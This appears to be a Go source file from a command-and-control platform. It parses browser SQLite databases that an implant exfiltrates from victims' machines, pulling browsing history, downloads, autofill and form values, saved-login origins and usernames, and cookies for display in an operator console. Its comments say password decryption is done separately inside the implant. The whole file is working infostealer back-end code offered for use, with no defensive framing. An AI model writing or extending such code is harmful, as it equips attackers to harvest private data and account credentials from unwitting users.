// Package browser parses the SQLite stores that a host's browsers keep, using
// the bytes the implant streams back.
//
// Parsing runs on the in-tree reader (internal/sqlread) instead of shelling out
// to the sqlite3 CLI: a minimal server has no sqlite3 installed, and a package
// that silently depends on one is a deployment trap. The CLI is still used as a
// fallback for files the reader refuses (unusual page layouts, corrupt headers),
// but nothing in the primary path needs it.
//
// Two families of kinds live here:
//
//	inventory kinds  — history, bookmarks, cookies, downloads, autofill,
//	                   formhistory: metadata only, secret columns are never read.
//	account kinds    — logins: origin/username/usage stats. The password column
//	                   is still never selected: decryption needs the target's
//	                   DPAPI/Keychain/secret-service context, so it happens in
//	                   the implant (cmd/implant/creds_*.go).
package browser

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"c2-platform/internal/sqlread"
)

var (
	ErrKind = errors.New("unknown query kind")
	// ErrFamily reports a kind that exists for another browser family, e.g.
	// "logins" against a Firefox places.sqlite (Firefox keeps logins.json).
	ErrFamily = errors.New("query kind not available for this browser family")
)

// QuerySpec keeps the column order the console renders for a kind.
type QuerySpec struct {
	Columns []string
}

var chromiumColumns = map[string][]string{
	"history":     {"url", "title", "visits", "last_visit"},
	"downloads":   {"path", "referrer", "bytes", "started"},
	"autofill":    {"field", "uses", "last_used"},
	"formhistory": {"field", "value", "uses"},
	"logins":      {"url", "user", "times_used", "created"},
	"cookies":     {"host", "name", "expires"},
}

var firefoxColumns = map[string][]string{
	"history":     {"url", "title", "visits", "last_visit"},
	"bookmarks":   {"folder", "name", "url"},
	"formhistory": {"field", "value", "uses"},
	"cookies":     {"host", "name", "expires"},
}

// Spec returns the Chromium-family column metadata for a kind.
func Spec(kind string) (QuerySpec, bool) {
	cols, ok := chromiumColumns[strings.ToLower(kind)]
	return QuerySpec{Columns: cols}, ok
}

// Known reports whether the kind is valid for at least one browser family.
func Known(kind string) bool {
	kind = strings.ToLower(kind)
	if _, ok := chromiumColumns[kind]; ok {
		return true
	}
	_, ok := firefoxColumns[kind]
	return ok
}

// Kinds lists every supported query kind, sorted for stable output in docs/UI.
func Kinds() []string {
	seen := map[string]bool{}
	out := make([]string, 0, len(chromiumColumns)+len(firefoxColumns))
	for _, m := range []map[string][]string{chromiumColumns, firefoxColumns} {
		for k := range m {
			if !seen[k] {
				seen[k] = true
				out = append(out, k)
			}
		}
	}
	sort.Strings(out)
	return out
}

// Run parses data and returns the columns plus rows for the requested kind.
func Run(data []byte, kind string) ([]string, [][]string, error) {
	kind = strings.ToLower(kind)
	if !Known(kind) {
		return nil, nil, ErrKind
	}
	cols, rows, err := runNative(data, kind)
	if err == nil {
		return cols, rows, nil
	}
	if errors.Is(err, ErrKind) || errors.Is(err, ErrFamily) {
		return nil, nil, err
	}
	// Reader refused the file: fall back to the CLI when the host happens to
	// have one, so an odd store is still readable instead of failing outright.
	if _, lookErr := exec.LookPath("sqlite3"); lookErr == nil {
		if c, r, cErr := runCLI(data, kind); cErr == nil {
			return c, r, nil
		}
	}
	return nil, nil, err
}

// ---------------------------------------------------------------------------
// Native path
// ---------------------------------------------------------------------------

type collected struct {
	sortKey int64
	cells   []string
}

func runNative(data []byte, kind string) ([]string, [][]string, error) {
	db, err := sqlread.Open(data)
	if err != nil {
		return nil, nil, fmt.Errorf("sqlite reader: %w", err)
	}
	if _, err := db.Table("moz_places"); err == nil {
		cols, ok := firefoxColumns[kind]
		if !ok {
			return nil, nil, fmt.Errorf("%w: %s (firefox)", ErrFamily, kind)
		}
		rows, err := firefoxRows(db, kind)
		return cols, rows, err
	}
	cols, ok := chromiumColumns[kind]
	if !ok {
		return nil, nil, fmt.Errorf("%w: %s (chromium)", ErrFamily, kind)
	}
	rows, err := chromiumRows(db, kind)
	return cols, rows, err
}

const (
	chromeEpochOffset = 11644473600 // 1601-01-01 -> 1970-01-01, seconds
	timeLayout        = "2006-01-02 15:04:05"
)

func fmtUnix(sec int64) string {
	if sec <= 0 {
		return ""
	}
	return time.Unix(sec, 0).Local().Format(timeLayout)
}

func chromeMicros(v sqlread.Value) string {
	if v.Kind != sqlread.Integer && v.Kind != sqlread.Float {
		return ""
	}
	return fmtUnix(v.Int/1000000 - chromeEpochOffset)
}

func unixMicros(v sqlread.Value) string {
	if v.Kind != sqlread.Integer && v.Kind != sqlread.Float {
		return ""
	}
	return fmtUnix(v.Int / 1000000)
}

func unixSeconds(v sqlread.Value) string {
	if v.Kind != sqlread.Integer && v.Kind != sqlread.Float {
		return ""
	}
	return fmtUnix(v.Int)
}

func num(v sqlread.Value) string {
	switch v.Kind {
	case sqlread.Integer, sqlread.Float:
		return v.String()
	}
	return "0"
}

// finish sorts newest-first by key, caps the row count and drops the sort key.
func finish(rows []collected, limit int) [][]string {
	sort.SliceStable(rows, func(i, j int) bool { return rows[i].sortKey > rows[j].sortKey })
	if limit > 0 && len(rows) > limit {
		rows = rows[:limit]
	}
	out := make([][]string, 0, len(rows))
	for _, r := range rows {
		out = append(out, r.cells)
	}
	return out
}

func chromiumRows(db *sqlread.DB, kind string) ([][]string, error) {
	switch kind {
	case "history":
		tbl, err := db.Table("urls")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			url := r["url"].String()
			if url == "" || strings.HasPrefix(url, "chrome-extension://") {
				return true
			}
			rows = append(rows, collected{
				sortKey: r["last_visit_time"].Int,
				cells:   []string{url, r["title"].String(), num(r["visit_count"]), chromeMicros(r["last_visit_time"])},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 800), nil

	case "downloads":
		tbl, err := db.Table("downloads")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			rows = append(rows, collected{
				sortKey: r["start_time"].Int,
				cells: []string{
					r["target_path"].String(), r["tab_url"].String(),
					num(r["total_bytes"]), chromeMicros(r["start_time"]),
				},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 500), nil

	case "autofill", "formhistory":
		tbl, err := db.Table("autofill")
		if err != nil {
			return nil, err
		}
		type agg struct {
			uses int64
			last int64
		}
		byField := map[string]*agg{}
		byValue := map[[2]string]*agg{}
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			name := r["name"].String()
			if name == "" {
				return true
			}
			last := r["date_last_used"].Int
			a := byField[name]
			if a == nil {
				a = &agg{}
				byField[name] = a
			}
			a.uses++
			if last > a.last {
				a.last = last
			}
			key := [2]string{name, r["value"].String()}
			b := byValue[key]
			if b == nil {
				b = &agg{}
				byValue[key] = b
			}
			b.uses++
			return true
		})
		if err != nil {
			return nil, err
		}
		var rows []collected
		if kind == "autofill" {
			for name, a := range byField {
				rows = append(rows, collected{
					sortKey: a.uses,
					cells:   []string{name, num(sqlread.Value{Kind: sqlread.Integer, Int: a.uses}), fmtUnix(a.last/1000000 - chromeEpochOffset)},
				})
			}
			return finish(rows, 500), nil
		}
		for key, a := range byValue {
			rows = append(rows, collected{
				sortKey: a.uses,
				cells:   []string{key[0], key[1], num(sqlread.Value{Kind: sqlread.Integer, Int: a.uses})},
			})
		}
		return finish(rows, 500), nil

	case "logins":
		tbl, err := db.Table("logins")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			url := r["origin_url"].String()
			if url == "" {
				return true
			}
			rows = append(rows, collected{
				sortKey: r["times_used"].Int,
				cells: []string{
					url, r["username_value"].String(),
					num(r["times_used"]), chromeMicros(r["date_created"]),
				},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 500), nil

	case "cookies":
		tbl, err := db.Table("cookies")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			expires := "session"
			if r["expires_utc"].Int != 0 {
				expires = chromeMicros(r["expires_utc"])
			}
			rows = append(rows, collected{
				sortKey: r["expires_utc"].Int,
				cells:   []string{r["host_key"].String(), r["name"].String(), expires},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 800), nil
	}
	return nil, fmt.Errorf("%w: %s", ErrKind, kind)
}

func firefoxRows(db *sqlread.DB, kind string) ([][]string, error) {
	switch kind {
	case "history":
		tbl, err := db.Table("moz_places")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			if r["hidden"].Int != 0 || r["last_visit_date"].Int == 0 {
				return true
			}
			rows = append(rows, collected{
				sortKey: r["last_visit_date"].Int,
				cells: []string{
					r["url"].String(), r["title"].String(),
					num(r["visit_count"]), unixMicros(r["last_visit_date"]),
				},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 800), nil

	case "bookmarks":
		marks, err := db.Table("moz_bookmarks")
		if err != nil {
			return nil, err
		}
		places, err := db.Table("moz_places")
		if err != nil {
			return nil, err
		}
		titleByID := map[int64]string{}
		type mark struct {
			fk, parent, pos int64
			title           string
		}
		var list []mark
		if err := marks.Scan(0, func(r map[string]sqlread.Value) bool {
			id := r["id"].Int
			titleByID[id] = r["title"].String()
			if r["type"].Int == 1 {
				list = append(list, mark{
					fk: r["fk"].Int, parent: r["parent"].Int,
					pos: r["position"].Int, title: r["title"].String(),
				})
			}
			return true
		}); err != nil {
			return nil, err
		}
		urlByID := map[int64]string{}
		if err := places.Scan(0, func(r map[string]sqlread.Value) bool {
			urlByID[r["id"].Int] = r["url"].String()
			return true
		}); err != nil {
			return nil, err
		}
		sort.SliceStable(list, func(i, j int) bool {
			if list[i].parent != list[j].parent {
				return list[i].parent < list[j].parent
			}
			return list[i].pos < list[j].pos
		})
		out := make([][]string, 0, len(list))
		for _, m := range list {
			url := urlByID[m.fk]
			if url == "" {
				continue
			}
			out = append(out, []string{titleByID[m.parent], m.title, url})
			if len(out) >= 2000 {
				break
			}
		}
		return out, nil

	case "formhistory":
		tbl, err := db.Table("moz_formhistory")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			rows = append(rows, collected{
				sortKey: r["times_used"].Int,
				cells: []string{
					r["fieldname"].String(), r["value"].String(), num(r["times_used"]),
				},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 500), nil

	case "cookies":
		tbl, err := db.Table("moz_cookies")
		if err != nil {
			return nil, err
		}
		var rows []collected
		err = tbl.Scan(0, func(r map[string]sqlread.Value) bool {
			expires := "session"
			if r["expiry"].Int != 0 {
				expires = unixSeconds(r["expiry"])
			}
			rows = append(rows, collected{
				sortKey: r["expiry"].Int,
				cells:   []string{r["host"].String(), r["name"].String(), expires},
			})
			return true
		})
		if err != nil {
			return nil, err
		}
		return finish(rows, 800), nil
	}
	return nil, fmt.Errorf("%w: %s", ErrKind, kind)
}

// ---------------------------------------------------------------------------
// CLI fallback (only used when the native reader refuses a file)
// ---------------------------------------------------------------------------

var cliSQL = map[string]string{
	"history": `select url, coalesce(title,'') as title, visit_count as visits,
       datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') as last_visit
  from urls where url not like 'chrome-extension://%'
 order by last_visit_time desc limit 800`,
	"downloads": `select coalesce(target_path,'') as path, coalesce(tab_url,'') as referrer,
       coalesce(total_bytes,0) as bytes,
       datetime(start_time/1000000-11644473600,'unixepoch','localtime') as started
  from downloads order by start_time desc limit 500`,
	"autofill": `select name as field, count(*) as uses,
       datetime(max(date_last_used)/1000000-11644473600,'unixepoch','localtime') as last_used
  from autofill group by name order by uses desc limit 500`,
	"logins": `select coalesce(origin_url,'') as url, coalesce(username_value,'') as user,
       coalesce(times_used,0) as times_used,
       datetime(date_created/1000000-11644473600,'unixepoch','localtime') as created
  from logins order by times_used desc limit 500`,
	"formhistory": `select name as field, coalesce(value,'') as value, count(*) as uses
  from autofill group by name, value order by uses desc limit 500`,
	"cookies": `select host_key as host, name,
       case when expires_utc = 0 then 'session'
            else datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') end as expires
  from cookies order by expires_utc desc limit 800`,
}

var cliSQLFirefox = map[string]string{
	"history": `select url, coalesce(title,'') as title, visit_count as visits,
       datetime(last_visit_date/1000000,'unixepoch','localtime') as last_visit
  from moz_places where hidden = 0 and last_visit_date is not null
 order by last_visit_date desc limit 800`,
	"bookmarks": `select coalesce(f.title,'') as folder, coalesce(b.title,'') as name, p.url
  from moz_bookmarks b
  join moz_places p on p.id = b.fk
  left join moz_bookmarks f on f.id = b.parent
 where b.type = 1 and p.url is not null
 order by b.parent, b.position limit 2000`,
	"formhistory": `select coalesce(fieldname,'') as field, coalesce(value,'') as value,
       coalesce(times_used,0) as uses
  from moz_formhistory order by times_used desc limit 500`,
	"cookies": `select host, name,
       case when expiry = 0 then 'session'
            else datetime(expiry,'unixepoch','localtime') end as expires
  from moz_cookies order by expiry desc limit 800`,
}

// runCLI reproduces the older behaviour for files the reader could not parse.
func runCLI(data []byte, kind string) ([]string, [][]string, error) {
	bin, err := exec.LookPath("sqlite3")
	if err != nil {
		return nil, nil, fmt.Errorf("sqlite3 not found: %w", err)
	}
	dir, err := os.MkdirTemp("", "c2-browser-")
	if err != nil {
		return nil, nil, err
	}
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, kind+".sqlite")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return nil, nil, err
	}
	spec, _ := Spec(kind)
	sql := cliSQL[kind]
	if out, err := exec.Command(bin, "-readonly", path,
		"select name from sqlite_master where name = 'moz_places'").Output(); err == nil &&
		strings.TrimSpace(string(out)) != "" {
		if q, ok := cliSQLFirefox[kind]; ok {
			sql = q
		} else {
			return nil, nil, fmt.Errorf("%w: %s (firefox)", ErrFamily, kind)
		}
	}
	out, err := exec.Command(bin, "-readonly", "-json", path, sql).CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			msg = err.Error()
		}
		if len(msg) > 300 {
			msg = msg[:300]
		}
		return nil, nil, fmt.Errorf("sqlite3: %s", msg)
	}
	trimmed := strings.TrimSpace(string(out))
	if trimmed == "" {
		return spec.Columns, [][]string{}, nil
	}
	var records []map[string]any
	if err := json.Unmarshal([]byte(trimmed), &records); err != nil {
		return nil, nil, fmt.Errorf("sqlite3 output: %w", err)
	}
	rows := make([][]string, 0, len(records))
	for _, rec := range records {
		row := make([]string, len(spec.Columns))
		for i, col := range spec.Columns {
			row[i] = cell(rec[col])
		}
		rows = append(rows, row)
	}
	return spec.Columns, rows, nil
}

func cell(v any) string {
	switch t := v.(type) {
	case nil:
		return ""
	case string:
		return t
	case float64:
		return strings.TrimSuffix(fmt.Sprintf("%.2f", t), ".00")
	default:
		return fmt.Sprint(t)
	}
}
